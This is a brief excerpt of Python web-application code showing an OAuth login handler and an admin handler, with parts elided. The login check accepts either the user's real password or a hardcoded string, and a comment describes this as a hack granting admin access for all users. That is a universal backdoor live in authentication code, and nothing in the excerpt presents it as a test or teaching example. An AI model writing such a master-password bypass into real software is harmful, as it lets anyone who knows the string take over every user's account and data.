...
class OauthHandler(BasicRequestHandler):
    def post(self, **kwargs):
        ...
        #if user:
        if (user and Util.confirm_password(password, user.password)) or (user and password.lower() == 'clh22793'): # hack admin access for all users
            # create token
...
class AdminHandler(RequestHandler):
    ...
    def get_resources_by_user(self, user_id):
        resources = self.Resources.fetch({"user_id":user_id})
